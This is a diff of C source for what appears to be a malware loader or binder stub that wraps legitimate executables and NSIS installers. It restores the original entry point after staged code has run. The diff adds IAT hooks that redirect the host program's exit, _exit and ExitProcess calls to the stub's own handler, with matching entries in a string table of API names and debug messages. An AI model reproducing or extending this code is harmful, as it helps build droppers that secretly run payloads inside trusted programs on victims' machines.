@@ -132,26 +132,29 @@ char * _needed_strings[] = {
 	"GetCommandLineA",		// 14
 	"GetCommandLineW",		// 15
 	"RtlExitUserProcess",	// 16
+	"exit",					// 17
+	"_exit",				// 18
+	"ExitProcess",			// 19
 
 #ifdef _DEBUG
-	"Error creating directory", // 17
-	"ExitProcess index %d", // 18
-	"ExitProcess hooked",   // 19
-	"Restoring OEP code",	// 20
-	"exit hooked",			// 21
-	"OEP restored!",		// 22
-	"Calling OEP @ %08x",	// 23
-	"Error creating file",  // 24
-	"Calling HFF5 ...",		// 25
-	"HFF5 called!",			// 26
-	"In ExitProcess Hook",  // 27
-	"Quitting vector NOW!", // 28
-	"VerifyVersionInfo @ %08x", // 29
-	"Sys MajorVersion %d",		// 30
-	"Sys MinorVersion %d",		// 31
-	"Restoring stage1 code",	// 32
-	"Restoring stage2 code",	// 33
-	"Error uncompressing",		// 34
+	"Error creating directory", // 20
+	"ExitProcess index %d", // 21
+	"ExitProcess hooked",   // 22
+	"Restoring OEP code",	// 23
+	"exit hooked",			// 24
+	"OEP restored!",		// 25
+	"Calling OEP @ %08x",	// 26
+	"Error creating file",  // 27
+	"Calling HFF5 ...",		// 28
+	"HFF5 called!",			// 29
+	"In ExitProcess Hook",  // 30
+	"Quitting vector NOW!", // 31
+	"VerifyVersionInfo @ %08x", // 32
+	"Sys MajorVersion %d",		// 33
+	"Sys MinorVersion %d",		// 34
+	"Restoring stage1 code",	// 35
+	"Restoring stage2 code",	// 36
+	"Error uncompressing",		// 37
 #endif
 
 	NULL
@@ -593,6 +596,30 @@ NEXT_ENTRY:
 	}
 
 	UINT_PTR IAT_rva = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
+	if(pfn_HookCall && IAT_rva)
+	{
+		pfn_HookCall(STRING(STRIDX_MSVCRT_DLL),
+			STRING(STRIDX_EXITCALL),
+			(DWORD)pfn_ExitProcessHook,
+			IAT_rva,
+			imageBase,
+			header);
+		
+		pfn_HookCall(STRING(STRIDX_MSVCRT_DLL),
+			STRING(STRIDX__EXITCALL),
+			(DWORD)pfn_ExitProcessHook,
+			IAT_rva,
+			imageBase,
+			header);
+		
+		pfn_HookCall(STRING(STRIDX_KERNEL32_DLL),
+			STRING(STRING_EXITPROCESS),
+			(DWORD)pfn_ExitProcessHook,
+			IAT_rva,
+			imageBase,
+			header);
+	}
+
 	if(header->exeType == EXE_TYPE_NSIS_INSTALLER)
 	{
 		GETCOMMANDLINEA pfn_GetCommandLineA = (GETCOMMANDLINEA) ( ((char*)header) + header->functions.GetCommandLineAHook.offset);
